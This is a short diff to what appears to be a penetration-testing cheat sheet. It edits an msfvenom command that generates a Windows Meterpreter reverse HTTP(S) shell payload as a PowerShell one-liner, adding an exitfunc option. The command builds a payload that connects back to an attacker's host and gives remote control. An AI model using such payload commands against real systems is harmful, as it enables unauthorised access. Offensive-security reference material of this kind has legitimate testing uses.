@@ -5,7 +5,7 @@
 - Generate a powershell one liner.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> -f psh-cmd
+$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
 ```
 
 ### 1.1 - Bash
